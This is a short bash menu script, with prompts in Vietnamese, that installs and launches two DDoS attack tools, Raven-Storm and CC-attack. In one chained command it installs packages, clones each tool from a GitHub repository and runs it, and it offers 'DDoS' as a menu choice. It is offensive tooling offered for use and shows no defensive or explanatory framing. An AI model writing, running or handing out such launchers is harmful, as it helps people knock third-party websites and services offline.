#!/bin/bash

echo "   1. Raven-Storm"
echo "   2. CC-attack"

echo -e ""
read -p "  Vui Lòng Nhập Một Lựa Chọn 1 Hoặc 2: " num

    case "${num}" in
        1)
		clear
		echo "   3. SETUP"
        echo "   4. DDoS"

        echo -e ""
        read -p "  Vui Lòng Nhập Một Lựa Chọn 1 Hoặc 2: " abc

    case "${abc}" in
        3) yum install python3 -y && yum install git -y && cd / && git clone https://github.com/Nghi235/Raven-Storm && cd Raven-Storm && pip3 install -r requirements.txt && python3 main.py
        ;;
        4) cd /Raven-Storm && python3 main.py
        ;;
        *) echo -e "  Chỉ Có Thể Nhập 3 Hoặc 4" && exit
        ;;
    esac
		
	     ;;
        2) 
		
		clear
		echo "   5. SETUP"
        echo "   6. DDoS"

        echo -e ""
        read -p "  Vui Lòng Nhập Một Lựa Chọn 1 Hoặc 2: " abc

    case "${abc}" in
        5) yum install python3 -y && yum install git -y && cd / && git clone https://github.com/Nghi235/CC-attack && cd CC-attack && pip3 install requests pysocks && python3 cc.py
        ;;
        6) cd /CC-attack && python3 cc.py
        ;;
        *) echo -e "  Chỉ Có Thể Nhập 5 Hoặc 6" && exit
        ;;
    esac
		
       ;;
        *) echo -e "  Chỉ Có Thể Nhập 1 Hoặc 2" && exit
        ;;
    esac


